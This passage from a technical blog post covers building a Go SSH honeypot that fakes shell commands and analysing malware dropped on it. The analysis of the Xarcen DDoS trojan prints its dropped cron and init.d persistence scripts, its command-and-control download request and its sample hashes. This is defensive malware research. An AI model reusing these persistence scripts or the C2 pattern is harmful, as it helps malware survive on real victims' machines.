<span class="lineno"> 17 </span>			<span class="nx">term</span> <span class="o">:=</span> <span class="nx">terminal</span><span class="p">.</span><span class="nx">NewTerminal</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">)</span>
<span class="lineno"> 18 </span>			<span class="k">go</span> <span class="nx">HandleTcpReading</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">perms</span><span class="p">)</span>
<span class="lineno"> 19 </span>		<span class="p">}</span>
<span class="lineno"> 20 </span>
<span class="lineno"> 21 </span>		<span class="c1">// Sessions have out-of-band requests such as &quot;shell&quot;, &quot;pty-req&quot; and &quot;env&quot;</span>
<span class="lineno"> 22 </span>		<span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">in</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 23 </span>			<span class="k">for</span> <span class="nx">req</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">in</span> <span class="p">{</span>
<span class="lineno"> 24 </span>				<span class="nx">term</span> <span class="o">:=</span> <span class="nx">terminal</span><span class="p">.</span><span class="nx">NewTerminal</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">)</span>
<span class="lineno"> 25 </span>				<span class="nx">handler</span> <span class="o">:=</span> <span class="nx">NewCommandHandler</span><span class="p">(</span><span class="nx">term</span><span class="p">)</span>
<span class="lineno"> 26 </span>				<span class="nx">handler</span><span class="p">.</span><span class="nx">Register</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">Ls</span><span class="p">{},</span> <span class="o">&amp;</span><span class="nx">LsAl</span><span class="p">{},</span>
<span class="lineno"> 27 </span>					<span class="o">&amp;</span><span class="nx">Help</span><span class="p">{},</span>
<span class="lineno"> 28 </span>					<span class="o">&amp;</span><span class="nx">Pwd</span><span class="p">{},</span>
<span class="lineno"> 29 </span>					<span class="o">&amp;</span><span class="nx">UnsetHistory</span><span class="p">{},</span>
<span class="lineno"> 30 </span>					<span class="o">&amp;</span><span class="nx">Uname</span><span class="p">{},</span>
<span class="lineno"> 31 </span>					<span class="o">&amp;</span><span class="nx">Echo</span><span class="p">{},</span>
<span class="lineno"> 32 </span>					<span class="o">&amp;</span><span class="nx">Whoami</span><span class="p">{</span><span class="nx">User</span><span class="p">:</span> <span class="s">&quot;root&quot;</span><span class="p">},</span>
<span class="lineno"> 33 </span>				<span class="p">)</span>
<span class="lineno"> 34 </span>
<span class="lineno"> 35 </span>				<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;Payload: %s&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span>
<span class="lineno"> 36 </span>				<span class="nx">ok</span> <span class="o">:=</span> <span class="kc">false</span>
<span class="lineno"> 37 </span>				<span class="k">switch</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span> <span class="p">{</span>
<span class="lineno"> 38 </span>				<span class="c1">// exec is used: ssh user@host &#39;some command&#39;</span>
<span class="lineno"> 39 </span>				<span class="k">case</span> <span class="s">&quot;exec&quot;</span><span class="p">:</span>
<span class="lineno"> 40 </span>					<span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
<span class="lineno"> 41 </span>					<span class="nx">command</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">4</span> <span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
<span class="lineno"> 42 </span>
<span class="lineno"> 43 </span>					<span class="nx">cmdOut</span><span class="p">,</span> <span class="nx">newLine</span> <span class="o">:=</span> <span class="nx">handler</span><span class="p">.</span><span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">command</span><span class="p">)</span>
<span class="lineno"> 44 </span>					<span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">cmdOut</span><span class="p">))</span>
<span class="lineno"> 45 </span>					<span class="k">if</span> <span class="nx">newLine</span> <span class="p">{</span>
<span class="lineno"> 46 </span>						<span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;\r\n&quot;</span><span class="p">))</span>
<span class="lineno"> 47 </span>					<span class="p">}</span>
<span class="lineno"> 48 </span>
<span class="lineno"> 49 </span>					<span class="nx">shellCommand</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ShellCommand</span><span class="p">{</span><span class="nx">Cmd</span><span class="p">:</span> <span class="nx">command</span><span class="p">,</span> <span class="nx">Guid</span><span class="p">:</span> <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">]}</span>
<span class="lineno"> 50 </span>					<span class="k">go</span> <span class="nx">shellCommand</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
<span class="lineno"> 51 </span>
<span class="lineno"> 52 </span>					<span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="lineno"> 53 </span>				<span class="c1">// shell is used: ssh user@host ... then commands are entered</span>
<span class="lineno"> 54 </span>				<span class="k">case</span> <span class="s">&quot;shell&quot;</span><span class="p">:</span>
<span class="lineno"> 55 </span>					<span class="k">for</span> <span class="p">{</span>
<span class="lineno"> 56 </span>						<span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;root@localhost:/# &quot;</span><span class="p">))</span>
<span class="lineno"> 57 </span>						<span class="nx">line</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">term</span><span class="p">.</span><span class="nx">ReadLine</span><span class="p">()</span>
<span class="lineno"> 58 </span>						<span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="nx">io</span><span class="p">.</span><span class="nx">EOF</span> <span class="p">{</span>
<span class="lineno"> 59 </span>							<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;EOF detected, closing&quot;</span><span class="p">)</span>
<span class="lineno"> 60 </span>							<span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="lineno"> 61 </span>							<span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
<span class="lineno"> 62 </span>							<span class="k">break</span>
<span class="lineno"> 63 </span>						<span class="p">}</span>
<span class="lineno"> 64 </span>						<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
<span class="lineno"> 65 </span>							<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;Error: %s&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
<span class="lineno"> 66 </span>						<span class="p">}</span>
<span class="lineno"> 67 </span>
<span class="lineno"> 68 </span>						<span class="nx">cmdOut</span><span class="p">,</span> <span class="nx">newLine</span> <span class="o">:=</span> <span class="nx">handler</span><span class="p">.</span><span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
<span class="lineno"> 69 </span>						<span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">cmdOut</span><span class="p">))</span>
<span class="lineno"> 70 </span>						<span class="k">if</span> <span class="nx">newLine</span> <span class="p">{</span>
<span class="lineno"> 71 </span>							<span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;\r\n&quot;</span><span class="p">))</span>
<span class="lineno"> 72 </span>						<span class="p">}</span>
<span class="lineno"> 73 </span>
<span class="lineno"> 74 </span>						<span class="nx">shellCommand</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ShellCommand</span><span class="p">{</span><span class="nx">Cmd</span><span class="p">:</span> <span class="nx">line</span><span class="p">,</span> <span class="nx">Guid</span><span class="p">:</span> <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">]}</span>
<span class="lineno"> 75 </span>						<span class="k">go</span> <span class="nx">shellCommand</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
<span class="lineno"> 76 </span>
<span class="lineno"> 77 </span>						<span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
<span class="lineno"> 78 </span>					<span class="p">}</span>
<span class="lineno"> 79 </span>					<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
<span class="lineno"> 80 </span>						<span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
<span class="lineno"> 81 </span>					<span class="p">}</span>
<span class="lineno"> 82 </span>				<span class="k">case</span> <span class="s">&quot;pty-req&quot;</span><span class="p">:</span>
<span class="lineno"> 83 </span>					<span class="c1">// Responding &#39;ok&#39; here will let the client</span>
<span class="lineno"> 84 </span>					<span class="c1">// know we have a pty ready for input</span>
<span class="lineno"> 85 </span>					<span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
<span class="lineno"> 86 </span>					<span class="c1">// Parse body...</span>
<span class="lineno"> 87 </span>					<span class="nx">termLen</span> <span class="o">:=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="lineno"> 88 </span>					<span class="nx">termEnv</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">4</span> <span class="p">:</span> <span class="nx">termLen</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
<span class="lineno"> 89 </span>					<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;pty-req &#39;%s&#39;&quot;</span><span class="p">,</span> <span class="nx">termEnv</span><span class="p">)</span>
<span class="lineno"> 90 </span>				<span class="k">default</span><span class="p">:</span>
<span class="lineno"> 91 </span>					<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;[%s] Payload: %s&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span>
<span class="lineno"> 92 </span>				<span class="p">}</span>
<span class="lineno"> 93 </span>
<span class="lineno"> 94 </span>				<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
<span class="lineno"> 95 </span>					<span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;declining %s request...&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span><span class="p">)</span>
<span class="lineno"> 96 </span>				<span class="p">}</span>
<span class="lineno"> 97 </span>
<span class="lineno"> 98 </span>				<span class="nx">req</span><span class="p">.</span><span class="nx">Reply</span><span class="p">(</span><span class="nx">ok</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
<span class="lineno"> 99 </span>			<span class="p">}</span>
<span class="lineno">100 </span>		<span class="p">}(</span><span class="nx">requests</span><span class="p">)</span>
<span class="lineno">101 </span>	<span class="p">}</span>
<span class="lineno">102 </span><span class="p">}</span>
</code></pre></div>


<p>On line 16 we&rsquo;re sending the TCP reading off to another function to get handled - the rest of the requests coming in out-of-band will be handled in the function on line 22.</p>

<p>On line 24 we use the <code>terminal</code> package to create a new terminal for reading input and sending output back to the user. Line 25 is our command handler which will do the regex and pattern matching.</p>

<p>Our case/switch statement is doing the heavy lifting here starting on line 39.</p>

<p>Now we need to understand the different types of SSH connections and requests that can be made:</p>

<ul>
<li><p>(line 16) <code>direct-tcpip</code> is what happens when you use your SSH connection to proxy TCP connections (like a SOCKS proxy).</p></li>

<li><p>(line 39) <code>exec</code> is what happens when you run commands like <code>ssh some user@host ‘ls -al’</code></p></li>

<li><p>(line 54) <code>shell</code> is what happens when you actually login and start executing commands, a PTY gets launched and you have an interactive command prompt.</p></li>

<li><p>(line 82) <code>pty-req</code> lets the SSH client know that its ready to accept input (works in conjunction with shell).</p></li>
</ul>

<p>These are all the command types we care about for now.</p>

<p><a name="simulating-commands"></a></p>

<h2 id="simulating-commands">Simulating Commands</h2>

<p>A few things we need to keep in mind for this part of the honeypot:</p>

<ul>
<li>Need to simulate commands that are run by attackers</li>
<li>Go’s interface pattern fits well here</li>
<li>Need to understand command return values

<ul>
<li>Does the command return a new line?</li>
<li>If output doesn’t match (including new lines) it may throw off bots/scripts that check for exact output matching</li>
</ul></li>
<li>Need to be able to match commands based on regex or equality

<ul>
<li>Needs to handle commands like:

<ul>
<li>echo -n test</li>
<li>echo test</li>
<li>echo foo bar baz</li>
</ul></li>
<li>Don’t want to write a handler for each variation of a command with flags - would never cover all cases</li>
</ul></li>
</ul>

<p>So with all that in mind lets lay out a framework for the command handler. We need something to register all of our commands, and then a structure for our commands to be run consistently.</p>

<div class="highlight"><pre><code class="language-go" data-lang="go"><span class="lineno"> 1 </span><span class="kd">type</span> <span class="nx">CommandHandler</span> <span class="kd">struct</span> <span class="p">{</span>
<span class="lineno"> 2 </span>	<span class="nx">Terminal</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span>
<span class="lineno"> 3 </span>	<span class="nx">Commands</span> <span class="p">[]</span><span class="nx">Command</span>
<span class="lineno"> 4 </span><span class="p">}</span>
<span class="lineno"> 5 </span>
<span class="lineno"> 6 </span><span class="kd">func</span> <span class="nx">NewCommandHandler</span><span class="p">(</span><span class="nx">term</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span><span class="p">)</span> <span class="o">*</span><span class="nx">CommandHandler</span> <span class="p">{</span>
<span class="lineno"> 7 </span>	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">CommandHandler</span><span class="p">{</span><span class="nx">Terminal</span><span class="p">:</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">Commands</span><span class="p">:</span> <span class="p">[]</span><span class="nx">Command</span><span class="p">{}}</span>
<span class="lineno"> 8 </span><span class="p">}</span>
<span class="lineno"> 9 </span>
<span class="lineno">10 </span><span class="kd">func</span> <span class="p">(</span><span class="nx">ch</span> <span class="o">*</span><span class="nx">CommandHandler</span><span class="p">)</span> <span class="nx">Register</span><span class="p">(</span><span class="nx">commands</span> <span class="o">...</span><span class="nx">Command</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">11 </span>	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">commands</span> <span class="p">{</span>
<span class="lineno">12 </span>		<span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
<span class="lineno">13 </span>	<span class="p">}</span>
<span class="lineno">14 </span><span class="p">}</span>
<span class="lineno">15 </span>
<span class="lineno">16 </span><span class="kd">func</span> <span class="p">(</span><span class="nx">ch</span> <span class="o">*</span><span class="nx">CommandHandler</span><span class="p">)</span> <span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">17 </span>	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span> <span class="p">{</span>
<span class="lineno">18 </span>		<span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Match</span><span class="p">(</span><span class="nx">strings</span><span class="p">.</span><span class="nx">TrimSpace</span><span class="p">(</span><span class="nx">in</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">19 </span>			<span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">in</span><span class="p">)</span>
<span class="lineno">20 </span>		<span class="p">}</span>
<span class="lineno">21 </span>	<span class="p">}</span>
<span class="lineno">22 </span>	<span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;bash: %s: command not found&quot;</span><span class="p">,</span> <span class="nx">in</span><span class="p">),</span> <span class="kc">false</span>
<span class="lineno">23 </span><span class="p">}</span>
<span class="lineno">24 </span>
<span class="lineno">25 </span><span class="kd">type</span> <span class="nx">Command</span> <span class="kd">interface</span> <span class="p">{</span>
<span class="lineno">26 </span>	<span class="nx">Match</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span>
<span class="lineno">27 </span>	<span class="nx">Run</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span>
<span class="lineno">28 </span><span class="p">}</span>
<span class="lineno">29 </span>
<span class="lineno">30 </span><span class="kd">type</span> <span class="nx">Echo</span> <span class="kd">struct</span><span class="p">{}</span>
<span class="lineno">31 </span>
<span class="lineno">32 </span><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Echo</span><span class="p">)</span> <span class="nx">Match</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
<span class="lineno">33 </span>	<span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">in</span><span class="p">,</span> <span class="s">&quot;echo&quot;</span><span class="p">)</span>
<span class="lineno">34 </span><span class="p">}</span>
<span class="lineno">35 </span>
<span class="lineno">36 </span><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Echo</span><span class="p">)</span> <span class="nx">Run</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">37 </span>	<span class="nx">x</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="nx">in</span><span class="p">,</span> <span class="s">&quot; &quot;</span><span class="p">)</span>
<span class="lineno">38 </span>	<span class="nx">newLine</span> <span class="o">:=</span> <span class="kc">true</span>
<span class="lineno">39 </span>	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="p">{</span>
<span class="lineno">40 </span>		<span class="k">if</span> <span class="nx">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;-n&quot;</span> <span class="p">{</span>
<span class="lineno">41 </span>			<span class="nx">newLine</span> <span class="p">=</span> <span class="kc">false</span>
<span class="lineno">42 </span>		<span class="p">}</span>
<span class="lineno">43 </span>	<span class="p">}</span>
<span class="lineno">44 </span>	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
<span class="lineno">45 </span>		<span class="k">return</span> <span class="s">&quot;&quot;</span><span class="p">,</span> <span class="kc">true</span>
<span class="lineno">46 </span>	<span class="p">}</span>
<span class="lineno">47 </span>	<span class="nx">startPos</span> <span class="o">:=</span> <span class="mi">1</span>
<span class="lineno">48 </span>	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;-&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">49 </span>		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="p">{</span>
<span class="lineno">50 </span>			<span class="nx">startPos</span> <span class="p">=</span> <span class="mi">2</span>
<span class="lineno">51 </span>		<span class="p">}</span>
<span class="lineno">52 </span>	<span class="p">}</span>
<span class="lineno">53 </span>
<span class="lineno">54 </span>	<span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Join</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">startPos</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)],</span> <span class="s">&quot; &quot;</span><span class="p">),</span> <span class="nx">newLine</span>
<span class="lineno">55 </span><span class="p">}</span>
</code></pre></div>


<p>On lines 1 and 6 we&rsquo;re creating our <code>CommandHandler</code> which will be where all commands get registered to and where we store our terminal to write to.</p>

<p>Line 10 lets us register <code>1...n</code> commands at once using go&rsquo;s variadic argument syntax.</p>

<p>Line 16 is our runner that will take in the input from attacker and run it through our registered commands. We return the command output and also whether or not it will output a newline at the end. If no command is registered that will match, we return the generic bash command not found.</p>

<p>Line 25 is our interface definition. We have two functions, <code>Match</code> and <code>Run</code>. <code>Run</code> follows the <code>MatchAndRun</code> pattern where we returns the command output and whether or not a newline is needed. The meat of this command can do wahtever you want it to do - in this case we&rsquo;re checking for some specific flags that I&rsquo;ve seen used on the honeypot and parsing them out.</p>

<p>The <code>Match</code> portion in this case is just a simple <code>Contains</code> check - you can do whatever you want in this portion - it just needs to return a boolean. Go nuts with regexes or just do a simple equality check.</p>

<p><a name="persistence-layer"></a></p>

<h2 id="persistence-layer">Persistence Layer</h2>

<p>For our persistence layer their isn’t anything special going on. We have a few configurable options via ENV vars, ability to skip sending commands to the remote, and ability to provide a SERVER_URL to dev against the local rails application.</p>

<p>Now that we have a working honeypot that is able to accept logins, simulate and record commands, we can start analyzing dropped files.</p>

<p><a name="analyzing-dropped-files"></a></p>

<h2 id="analyzing-dropped-files">Analyzing Dropped Files</h2>

<p>Tools we’ll be using from OS X (please note this is not exhaustive):</p>

<ul>
<li>Virtualbox</li>
<li>Docker (<code>docker-machine</code> on OS X)</li>
<li>Wireshark</li>
<li>VirusTotal</li>
</ul>

<p>We’re going to use wireshark to process PCAP files generated by Wireshark, so we’ll need to tell VirtualBox to create the network capture:</p>

<pre><code class="language-bash">/Applications/VirtualBox.app/Contents/MacOS/VBoxManage modifyvm default --nictrace1 on --nictracefile1 /tmp/log.pcap
</code></pre>

<p><center><small>You may need to stop the docker container for this command to generate pcap files</small></center>
<br>
We can exec into the container to check running processes and see other commands being run.</p>

<p>We’ll be using docker to dump a clean image and an infected image, in order to see what files were modified and/or dropped onto the file system:</p>

<pre><code class="language-bash">docker export container_id &gt; container.tar
tar xvf container.tar -C container-dump
</code></pre>

<p>What you want to do in order to get a clean a dump as possible:</p>

<ul>
<li>Run a plain ubuntu container <code>docker run -it ubuntu bash</code> to get into it and at the console</li>
<li>Run any commands you want (like <code>apt-get update</code> or <code>apt-get install wget</code> or whatever other tools you think you will need)</li>
<li>Save the &ldquo;comparison&rdquo; container using <code>docker export</code> then extract it into a folder</li>
</ul>

<p>Now when running the malware (assuming its in the current directory):</p>

<pre><code class="language-bash">docker run -it --volume=`pwd`:/malware:ro ubuntu bash
</code></pre>

<p>Repeat the same commands you ran above in the &ldquo;comparison&rdquo; container (or save it as an image and spawn from that).</p>

<p>Now you can exec into your container and run the malware. Depending on how comfortable you are with monitoring your own network you should be doing this on an isolated network. Now to running the two malware samples we&rsquo;ll be going over today:</p>

<p><a name="trojan"></a></p>

<h2 id="trojan-ddos-linux-xarcen-a">Trojan-DDoS.Linux.Xarcen.a</h2>

<p><strong>Common name:</strong> HEUR:Trojan-DDoS.Linux.Xarcen.a<br>
<strong>sha256:</strong> acbccef76341af012bdf8f0022b302c08c72c6911631f98de8d9f694b3460e25<br>
<strong>md5:</strong> 63f286aa32a4baaa8b0dd137eb4b3361</p>

<p>Initial look:</p>

<ul>
<li>C&amp;C trojan</li>
<li>Drops multiple copies of itself</li>
<li>Will randomly spawn processes and change process names</li>
</ul>

<h4 id="process-output">Process output</h4>

<pre><code class="language-bash">root@f702ada96794:/malware# ps ax
  PID TTY      STAT   TIME COMMAND
    1 ?        Ss     0:00 bash
   21 ?        Ssl    0:00 netstat -antop
   72 ?        Ss     0:00 bash
   75 ?        Ss     0:00 pwd
   78 ?        Ss     0:00 route -n
   80 ?        Ss     0:00 grep &quot;A&quot;
   81 ?        Ss     0:00 whoami
   93 ?        Ss     0:00 cat resolv.conf
   96 ?        Ss     0:00 whoami
   99 ?        R+     0:00 ps ax
  100 ?        Ss     0:00 su
  102 ?        R      0:00 /usr/bin/nnqucjsvsp who 21
root@f702ada96794:/malware# ps ax
  PID TTY      STAT   TIME COMMAND
    1 ?        Ss     0:00 bash
   21 ?        Ssl    0:00 netstat -antop
   93 ?        Ss     0:00 cat resolv.conf
   96 ?        Ss     0:00 whoami
  100 ?        Ss     0:00 su
  102 ?        Ss     0:00 who
  103 ?        Ss     0:00 id
  104 ?        R+     0:00 ps ax
root@f702ada96794:/malware# ps ax
  PID TTY      STAT   TIME COMMAND
    1 ?        Ss     0:00 bash
   21 ?        Ssl    0:00 netstat -antop
   93 ?        Ss     0:00 cat resolv.conf
   96 ?        Ss     0:00 whoami
  100 ?        Ss     0:00 su
  102 ?        Ss     0:00 who
  103 ?        Ss     0:00 id
</code></pre>

<h4 id="network-traffic">Network Traffic</h4>

<pre><code class="language-bash">Frame 523: 271 bytes on wire (2168 bits), 271 bytes captured (2168 bits)
Ethernet II, Src: CadmusCo_26:3d:b9 (08:00:27:26:3d:b9), Dst: RealtekU_12:35:02 (52:54:00:12:35:02)
Internet Protocol Version 4, Src: 10.0.2.15, Dst: 23.234.60.143
Transmission Control Protocol, Src Port: 39433 (39433), Dst Port: 80 (80), Seq: 1, Ack: 1, Len: 217
Hypertext Transfer Protocol
    GET /config.rar HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET /config.rar HTTP/1.1\r\n]
        Request Method: GET
        Request URI: /config.rar
        Request Version: HTTP/1.1
    Accept: */*\r\n
    Accept-Language: zh-cn\r\n
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)\r\n
    Host: aa.hostasa.org\r\n
    Connection: Keep-Alive\r\n
    \r\n
    [Full request URI: http://aa.hostasa.org/config.rar]
    [HTTP request 1/1]
    [Response in frame: 537]
</code></pre>

<h4 id="dropped-files">Dropped Files</h4>

<p>2 binaries were dropped onto the file system, which looked to be copies of itself:</p>

<ul>
<li><strong>g7hs-dump/usr/bin/filupxsndj</strong>

<ul>
<li>sha256: 3657bd42fef97343c78a199d3611285e6fe7b88cc91e127d17ebbbbb2fd2f292</li>
<li>Common name: HEUR:Trojan-DDoS.Linux.Xarcen.a</li>
</ul></li>
<li><strong>g7hs-dump/lib/libudev.so</strong>

<ul>
<li>sha256: acbccef76341af012bdf8f0022b302c08c72c6911631f98de8d9f694b3460e25</li>
<li>Common name: HEUR:Trojan-DDoS.Linux.Xarcen.a</li>
</ul></li>
</ul>

<p>Several other plain text files were dropped in order to ensure startup:</p>

<p><strong>/etc/cron.hourly/gcc.sh</strong></p>

<pre><code class="language-bash">#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up&amp; done
cp /lib/libudev.so /lib/libudev.so.6
/lib/libudev.so.6
</code></pre>

<p><strong>/etc/crontab</strong></p>

<pre><code class="language-bash">*/3 * * * * root /etc/cron.hourly/gcc.sh
</code></pre>

<p><strong>/etc/init.d/filupxsndj</strong></p>

<pre><code class="language-bash">#!/bin/sh
# chkconfig: 12345 90 90
# description: filupxsndj
### BEGIN INIT INFO
# Provides:            filupxsndj
# Required-Start:
# Required-Stop:
# Default-Start:      1 2 3 4 5
# Default-Stop:
# Short-Description:  filupxsndj
### END INIT INFO

case $1 in
start)
      /usr/bin/filupxsndj
      ;;
stop)
      ;;
*)
      /usr/bin/filupxsndj
      ;;
esac
</code></pre>

<p><strong>/etc/rc1.d/S90filupxsndj</strong></p>

<p><strong>/etc/init.d/filupxsndj</strong></p>

<p><strong>/etc/rc2.d/S90filupxsndj</strong></p>

<p><strong>/etc/init.d/filupxsndj</strong></p>

<p><strong>/etc/rc3.d/S90filupxsndj</strong></p>

<p><strong>/etc/rc4.d/S90filupxsndj</strong></p>

<p><strong>/etc/init.d/filupxsndj</strong></p>

<p><strong>/etc/rc5.d/S90filupxsndj</strong></p>

<p><strong>/etc/init.d/filupxsndj</strong></p>

<pre><code class="language-bash">/etc/init.d/filupxsndj
</code></pre>

<p><strong>/lib/libudev.so</strong></p>

<p><em>binary</em></p>

<p><strong>/run/gcc.pid</strong></p>

<pre><code class="language-bash">bfpftcdsdhkveetlovyuysfcaeyrxboz
</code></pre>

<h4 id="overview">Overview</h4>

